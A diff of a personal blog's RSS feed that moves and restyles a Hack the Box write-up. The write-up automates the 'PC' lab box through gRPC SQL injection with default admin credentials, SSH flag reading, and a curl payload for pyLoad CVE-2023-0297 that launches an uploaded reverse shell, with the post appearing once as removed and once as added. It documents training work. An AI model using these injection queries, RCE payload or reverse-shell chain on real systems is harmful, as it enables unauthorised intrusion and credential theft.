@@ -5,117 +5,8 @@
         <description>Recent content in Posts on Bayesian Blogs</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Mon, 29 Jan 2024 20:05:09 -0800</lastBuildDate>
+        <lastBuildDate>Sun, 14 Jan 2024 21:51:34 -0800</lastBuildDate>
         <atom:link href="https://baishya.xyz/posts/index.xml" rel="self" type="application/rss+xml" />
-        
-        <item>
-            <title>Hack the Box — PC, but automated</title>
-            <link>https://baishya.xyz/posts/htb-pc/</link>
-            <pubDate>Mon, 29 Jan 2024 20:05:09 -0800</pubDate>
-            
-            <guid>https://baishya.xyz/posts/htb-pc/</guid>
-            <description>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.</description>
-            <content type="html"><![CDATA[<p>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.</p>
-<p><em>Note 1: This is not a proper write-up of the PC box. There is already an official write-up by the creator of the box which is very thorough and explains all the details of the box. There are many unofficial writeups as well. There’s also ippsec’s video on his channel.</em></p>
-<p><em>Note 2: This script only automates the steps that need to be taken to get the flags. It does not automate the looking for the vulnerabilities part. After I completed the box, I automated the steps I took to get the flags.</em></p>
-<p>The complete code for this script can be found on <a href="https://github.com/anuraagbaishya/htb-pc">Github</a>.</p>
-<h2 id="setup-grpc">Setup grpc</h2>
-<p>The box is running a grpc service on port 50051. Therefore, to interact with the service, we need a grpc client. I followed a <a href="https://grpc.io/docs/languages/python/basics/">tutorial</a> on how to create a grpc client using thegrpcio-tools Python library. The first step was to define the service in a .proto file. My service definition is here. Once the service is defined grpcio-tools can generate the client code for you. You can use a command like this:</p>
-<pre tabindex="0"><code>$ python -m grpc_tools.protoc -I../../protos --python_out=. --pyi_out=. --grpc_python_out=. SimpleApp.proto
-</code></pre><p>For me, this generated 2 additional files, <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2.py"><code>SimpleApp_pb2.py</code></a> and <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2_grpc.py"><code>SimpleApp_pb2_grpc.py</code></a> . I will not explain what these files do here, since that itself is a lengthy topic of discussion. If you are curious, the tutorial link I added earlier has a lot of resources to understand grpc and how it works.</p>
-<p>Once we have the required files generated, we can connect to the grpc service:</p>
-<pre tabindex="0"><code>def _setup_grpc(self):
-    channel = grpc.insecure_channel(f&#34;{self.host}:{self.grpc_port}&#34;)
-    stub = pb2_grpc.SimpleAppStub(channel)
-
-    return stub
-</code></pre><p>Here <code>pb2_grpc</code> contains the client and server classes corresponding to protobuf-defined grpc services.</p>
-<h2 id="sql-injection-in-grpc">SQL Injection in grpc</h2>
-<p>The grpc service exposes a <code>getInfoRequest</code> which takes an id parameter. It then uses the id to make an SQL query. The id parameter is vulnerable to SQL injection. We can exploit it by making a query like:</p>
-<pre tabindex="0"><code>query = &#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;
-pb2.getInfoRequest(id=query) 
-</code></pre><p>Here <code>pb2</code> is the protobuf client we will use to interact with the grpc service. The above request will get the tables from <code>sqlite_master</code>.</p>
-<p>This does not work out of the box, however. It requires an admin token to be sent as metadata. We can obtain the token by sending a <code>LoginUserRequest</code>. The username/password is conveniently set to admin/admin.</p>
-<pre tabindex="0"><code>def _get_token(self):
-    user = pb2.LoginUserRequest(username=&#34;admin&#34;, password=&#34;admin&#34;)
-    _, call = self.stub.LoginUser.with_call(user)
-    metadata = call.trailing_metadata()
-    token = metadata[0].value[2:-1]
-
-    return token
-</code></pre><p>Once I had the token, I could make the <code>getInfoRequest</code> request and get the user details. To get the user details, I first got the table name, then the columns in the table, and finally queried all the columns of the table.</p>
-<pre tabindex="0"><code>def _get_users(self) -&gt; dict:
-    print(&#34;Getting users&#34;)
-
-    query = &#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;
-    table = self._sql_injection_request(query)
-
-    query = f&#34;62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info(&#39;{table}&#39;)&#34;
-    cols = self._sql_injection_request(query)
-
-    res = []
-    for col in cols.split(&#34;,&#34;):
-        query = f&#34;62 UNION SELECT GROUP_CONCAT({col}) FROM {table}&#34;
-        r = self._sql_injection_request(query)
-        res.append(r.split(&#34;,&#34;))
-
-    usernames = res[0]
-    passwords = res[1]
-
-    users = []
-    for i in range(len(usernames)):
-        users.append({&#34;username&#34;: usernames[i], &#34;password&#34;: passwords[i]})
-
-    print(&#34;Users found&#34;)
-    print(json.dumps(users))
-
-    return users
-</code></pre><p>The <code>_sql_injection_request</code> function is defined as:</p>
-<pre tabindex="0"><code>def _sql_injection_request(self, query):
-    metadata = ((&#34;token&#34;, self.token),)
-    id_request = pb2.getInfoRequest(id=query)
-    r = self.stub.getInfo.with_call(id_request, metadata=metadata)
-    return r[0].message
-</code></pre><h2 id="getting-user-flag">Getting user flag</h2>
-<p>The user list has a user <code>sau</code> , who has SSH access to the machine. The next step is to start an SSH session and read the user flag stored at <code>/home/sau/user.txt</code>. This is quite straightforward. I created a simple SSH Client using the <code>paramiko</code> library and executed <code>cat /home/sau/user.txt</code>:</p>
-<pre tabindex="0"><code>def exec_command(self, command):
-    ssh_stdin, ssh_stdout, ssh_stderr = self.client.exec_command(command)
-    return ssh_stdout.read().decode(&#34;utf-8&#34;)
-</code></pre><h2 id="pyload-cve">PyLoad CVE</h2>
-<p>PyLoad is an open-source download manager. PyLoad versions prior to 0.5.0b3.dev31 are vulnerable to pre-auth RCE (CVE-2023–0297). There are many available exploits for this vulnerability. You can read more about the vulnerability and the exploit <a href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad">here</a>.</p>
-<p>The vulnerability allows us to execute a payload like this:</p>
-<pre tabindex="0"><code>curl -i -s -k -X $&#39;POST&#39; \
---data-binary
-$&#39;jk=pyimport%20os;os.system(\&#34;bash%20/home/sau/shell.sh\&#34;);f=function%20f2()
-{};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39; \
-$&#39;http://localhost:8000/flash/addcrypted2&#39;
-</code></pre><p>Here, I am running a script called <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/shell.sh"><code>shell.sh</code></a> which is just a bash reverse shell.</p>
-<p>PyLoad on this box is not available publicly. It can only be accessed from within the box. The official write-up uses SSH tunneling to tunnel from the user’s machine to the box. I chose the alternative option of running the exploit from within the SSH session, using the same <code>exec_command</code> function I used to read the user flag.</p>
-<p>I used SFTP to transfer the reverse shell to the box:</p>
-<pre tabindex="0"><code>def transfer_file_from_local(self):
-    ftp_client = self.client.open_sftp()
-    ftp_client.put(&#34;shell.sh&#34;, &#34;/home/sau/shell.sh&#34;)
-</code></pre><p>The last step is to start a reverse shell listener and then read the root flag from within the reverse shell session. For this, I created a simple <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/revsh.py">socket client</a> which listens for a connection and then performs <code>cat /root/root.txt</code>.</p>
-<p>I ran both the exploitation script and the socket client as two separate processes using a shell script:</p>
-<pre tabindex="0"><code>#! /bin/bash
-
-python auto_exploit.py &amp;
-python revsh.py
-</code></pre><p>It might (should) be possible to run the exploitation part and socket listener as separate threads of the same process. I tried for a bit, but it didn’t work and I just chose the easy way out.</p>
-<p>Running the runner script, I got both the user and root flags:</p>
-<p><img src="/flags.webp" alt="Flags"></p>
-<h2 id="closing-thoughts">Closing Thoughts</h2>
-<p>This experiment was a lot of fun. After completing this box, I pondered over what makes a box scriptable. I think the correct answer is — all boxes are scriptable if one is willing to persevere. The more practical questions what makes a box easy to script. I have come up with these criteria:</p>
-<ul>
-<li>Requires little to no UI interaction like clicking buttons, filing forms, etc that cannot be replicated using direct web / API calls. It might be possible to replicate these functionalities using selenium or similar — but that increases the complexity of the script.</li>
-<li>Related to the above — requires performing operations using some software running on one of the open ports or the machine. These might be web UIs or even CLI programs installed in the box.</li>
-<li>Has a lot of steps / requires running a lot of tools. The time required to create the script will be directly proportionate to the number of steps.</li>
-</ul>
-<p>This was the first (and only) box I have tried to script. I have done a few other boxes after this one, but I did not spend time trying to script them because of one of the above reasons. As I complete more boxes, I will continue to assess if the box is easy to script. If yes, great! If not, it may have to do with one of the above reasons, or I might have some other new reasons.</p>
-<p>That’s it from me. This is my 2023 contribution to my blog. I will not promise anything else here till a really long time has passed since this publication. I usually don’t work on technical things during my free time. Most (if not all) of the security work I do is by virtue of my employment. Therefore, there usually is not much for me to share.</p>
-<p>Thanks for reading!</p>
-]]></content>
-        </item>
         
         <item>
             <title>Tales from my Product Security Job Hunt: Part 2, Preparation</title>
@@ -337,6 +228,115 @@ Many of those whom I informed about my decision and/or my interviews were intere
 </ul>
 <hr>
 <p>I hope you found this useful. Do check out part 2, where I talk more about the interview prep. If you have any questions or need any help with interview prep, don’t hesitate to reach out to me (preferably on LinkedIn).</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Hack the Box — PC, but automated</title>
+            <link>https://baishya.xyz/posts/htb-pc/</link>
+            <pubDate>Mon, 06 Nov 2023 20:05:09 -0800</pubDate>
+            
+            <guid>https://baishya.xyz/posts/htb-pc/</guid>
+            <description>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.</description>
+            <content type="html"><![CDATA[<p>PC is an easy Linux box that has a grpc service and a vulnerable version of an application running on it. While doing this box, I had gone to the forums for a hint, and I saw a comment that said something along the lines of “I wrote a script that can solve this box”. I found this quite intriguing and decided to write a script that could solve the box myself.</p>
+<p><em>Note 1: This is not a proper write-up of the PC box. There is already an official write-up by the creator of the box which is very thorough and explains all the details of the box. There are many unofficial writeups as well. There’s also ippsec’s video on his channel.</em></p>
+<p><em>Note 2: This script only automates the steps that need to be taken to get the flags. It does not automate the looking for the vulnerabilities part. After I completed the box, I automated the steps I took to get the flags.</em></p>
+<p>The complete code for this script can be found on <a href="https://github.com/anuraagbaishya/htb-pc">Github</a>.</p>
+<h2 id="setup-grpc">Setup grpc</h2>
+<p>The box is running a grpc service on port 50051. Therefore, to interact with the service, we need a grpc client. I followed a <a href="https://grpc.io/docs/languages/python/basics/">tutorial</a> on how to create a grpc client using thegrpcio-tools Python library. The first step was to define the service in a .proto file. My service definition is here. Once the service is defined grpcio-tools can generate the client code for you. You can use a command like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ python -m grpc_tools.protoc -I../../protos --python_out<span style="color:#f92672">=</span>. --pyi_out<span style="color:#f92672">=</span>. --grpc_python_out<span style="color:#f92672">=</span>. SimpleApp.proto
+</span></span></code></pre></div><p>For me, this generated 2 additional files, <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2.py"><code>SimpleApp_pb2.py</code></a> and <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/SimpleApp_pb2_grpc.py"><code>SimpleApp_pb2_grpc.py</code></a> . I will not explain what these files do here, since that itself is a lengthy topic of discussion. If you are curious, the tutorial link I added earlier has a lot of resources to understand grpc and how it works.</p>
+<p>Once we have the required files generated, we can connect to the grpc service:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_setup_grpc</span>(self):
+</span></span><span style="display:flex;"><span>    channel <span style="color:#f92672">=</span> grpc<span style="color:#f92672">.</span>insecure_channel(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:</span><span style="color:#e6db74">{</span>self<span style="color:#f92672">.</span>grpc_port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    stub <span style="color:#f92672">=</span> pb2_grpc<span style="color:#f92672">.</span>SimpleAppStub(channel)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> stub
+</span></span></code></pre></div><p>Here <code>pb2_grpc</code> contains the client and server classes corresponding to protobuf-defined grpc services.</p>
+<h2 id="sql-injection-in-grpc">SQL Injection in grpc</h2>
+<p>The grpc service exposes a <code>getInfoRequest</code> which takes an id parameter. It then uses the id to make an SQL query. The id parameter is vulnerable to SQL injection. We can exploit it by making a query like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>pb2<span style="color:#f92672">.</span>getInfoRequest(id<span style="color:#f92672">=</span>query) 
+</span></span></code></pre></div><p>Here <code>pb2</code> is the protobuf client we will use to interact with the grpc service. The above request will get the tables from <code>sqlite_master</code>.</p>
+<p>This does not work out of the box, however. It requires an admin token to be sent as metadata. We can obtain the token by sending a <code>LoginUserRequest</code>. The username/password is conveniently set to admin/admin.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_token</span>(self):
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> pb2<span style="color:#f92672">.</span>LoginUserRequest(username<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>, password<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;admin&#34;</span>)
+</span></span><span style="display:flex;"><span>    _, call <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>stub<span style="color:#f92672">.</span>LoginUser<span style="color:#f92672">.</span>with_call(user)
+</span></span><span style="display:flex;"><span>    metadata <span style="color:#f92672">=</span> call<span style="color:#f92672">.</span>trailing_metadata()
+</span></span><span style="display:flex;"><span>    token <span style="color:#f92672">=</span> metadata[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>value[<span style="color:#ae81ff">2</span>:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> token
+</span></span></code></pre></div><p>Once I had the token, I could make the <code>getInfoRequest</code> request and get the user details. To get the user details, I first got the table name, then the columns in the table, and finally queried all the columns of the table.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_users</span>(self) <span style="color:#f92672">-&gt;</span> dict:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Getting users&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;62 UNION SELECT name FROM sqlite_master where type=&#39;table&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>    table <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info(&#39;</span><span style="color:#e6db74">{</span>table<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;)&#34;</span>
+</span></span><span style="display:flex;"><span>    cols <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    res <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> col <span style="color:#f92672">in</span> cols<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>):
+</span></span><span style="display:flex;"><span>        query <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;62 UNION SELECT GROUP_CONCAT(</span><span style="color:#e6db74">{</span>col<span style="color:#e6db74">}</span><span style="color:#e6db74">) FROM </span><span style="color:#e6db74">{</span>table<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_sql_injection_request(query)
+</span></span><span style="display:flex;"><span>        res<span style="color:#f92672">.</span>append(r<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;,&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    usernames <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>    passwords <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    users <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(usernames)):
+</span></span><span style="display:flex;"><span>        users<span style="color:#f92672">.</span>append({<span style="color:#e6db74">&#34;username&#34;</span>: usernames[i], <span style="color:#e6db74">&#34;password&#34;</span>: passwords[i]})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Users found&#34;</span>)
+</span></span><span style="display:flex;"><span>    print(json<span style="color:#f92672">.</span>dumps(users))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> users
+</span></span></code></pre></div><p>The <code>_sql_injection_request</code> function is defined as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_sql_injection_request</span>(self, query):
+</span></span><span style="display:flex;"><span>    metadata <span style="color:#f92672">=</span> ((<span style="color:#e6db74">&#34;token&#34;</span>, self<span style="color:#f92672">.</span>token),)
+</span></span><span style="display:flex;"><span>    id_request <span style="color:#f92672">=</span> pb2<span style="color:#f92672">.</span>getInfoRequest(id<span style="color:#f92672">=</span>query)
+</span></span><span style="display:flex;"><span>    r <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>stub<span style="color:#f92672">.</span>getInfo<span style="color:#f92672">.</span>with_call(id_request, metadata<span style="color:#f92672">=</span>metadata)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span>message
+</span></span></code></pre></div><h2 id="getting-user-flag">Getting user flag</h2>
+<p>The user list has a user <code>sau</code> , who has SSH access to the machine. The next step is to start an SSH session and read the user flag stored at <code>/home/sau/user.txt</code>. This is quite straightforward. I created a simple SSH Client using the <code>paramiko</code> library and executed <code>cat /home/sau/user.txt</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exec_command</span>(self, command):
+</span></span><span style="display:flex;"><span>    ssh_stdin, ssh_stdout, ssh_stderr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>exec_command(command)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ssh_stdout<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>)
+</span></span></code></pre></div><h2 id="pyload-cve">PyLoad CVE</h2>
+<p>PyLoad is an open-source download manager. PyLoad versions prior to 0.5.0b3.dev31 are vulnerable to pre-auth RCE (CVE-2023–0297). There are many available exploits for this vulnerability. You can read more about the vulnerability and the exploit <a href="https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad">here</a>.</p>
+<p>The vulnerability allows us to execute a payload like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -i -s -k -X <span style="color:#e6db74">$&#39;POST&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>--data-binary
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">$&#39;jk=pyimport%20os;os.system(\&#34;bash%20/home/sau/shell.sh\&#34;);f=function%20f2()
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{};&amp;package=xxx&amp;crypted=AAAA&amp;&amp;passwords=aaaa&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span><span style="color:#e6db74">$&#39;http://localhost:8000/flash/addcrypted2&#39;</span>
+</span></span></code></pre></div><p>Here, I am running a script called <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/shell.sh"><code>shell.sh</code></a> which is just a bash reverse shell.</p>
+<p>PyLoad on this box is not available publicly. It can only be accessed from within the box. The official write-up uses SSH tunneling to tunnel from the user’s machine to the box. I chose the alternative option of running the exploit from within the SSH session, using the same <code>exec_command</code> function I used to read the user flag.</p>
+<p>I used SFTP to transfer the reverse shell to the box:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">transfer_file_from_local</span>(self):
+</span></span><span style="display:flex;"><span>    ftp_client <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>client<span style="color:#f92672">.</span>open_sftp()
+</span></span><span style="display:flex;"><span>    ftp_client<span style="color:#f92672">.</span>put(<span style="color:#e6db74">&#34;shell.sh&#34;</span>, <span style="color:#e6db74">&#34;/home/sau/shell.sh&#34;</span>)
+</span></span></code></pre></div><p>The last step is to start a reverse shell listener and then read the root flag from within the reverse shell session. For this, I created a simple <a href="https://github.com/anuraagbaishya/htb-pc/blob/main/revsh.py">socket client</a> which listens for a connection and then performs <code>cat /root/root.txt</code>.</p>
+<p>I ran both the exploitation script and the socket client as two separate processes using a shell script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#! /bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>python auto_exploit.py &amp;
+</span></span><span style="display:flex;"><span>python revsh.py
+</span></span></code></pre></div><p>It might (should) be possible to run the exploitation part and socket listener as separate threads of the same process. I tried for a bit, but it didn’t work and I just chose the easy way out.</p>
+<p>Running the runner script, I got both the user and root flags:</p>
+<p><img src="/flags.webp" alt="Flags"></p>
+<h2 id="closing-thoughts">Closing Thoughts</h2>
+<p>This experiment was a lot of fun. After completing this box, I pondered over what makes a box scriptable. I think the correct answer is — all boxes are scriptable if one is willing to persevere. The more practical questions what makes a box easy to script. I have come up with these criteria:</p>
+<ul>
+<li>Requires little to no UI interaction like clicking buttons, filing forms, etc that cannot be replicated using direct web / API calls. It might be possible to replicate these functionalities using selenium or similar — but that increases the complexity of the script.</li>
+<li>Related to the above — requires performing operations using some software running on one of the open ports or the machine. These might be web UIs or even CLI programs installed in the box.</li>
+<li>Has a lot of steps / requires running a lot of tools. The time required to create the script will be directly proportionate to the number of steps.</li>
+</ul>
+<p>This was the first (and only) box I have tried to script. I have done a few other boxes after this one, but I did not spend time trying to script them because of one of the above reasons. As I complete more boxes, I will continue to assess if the box is easy to script. If yes, great! If not, it may have to do with one of the above reasons, or I might have some other new reasons.</p>
+<p>That’s it from me. This is my 2023 contribution to my blog. I will not promise anything else here till a really long time has passed since this publication. I usually don’t work on technical things during my free time. Most (if not all) of the security work I do is by virtue of my employment. Therefore, there usually is not much for me to share.</p>
+<p>Thanks for reading!</p>
 ]]></content>
         </item>
         
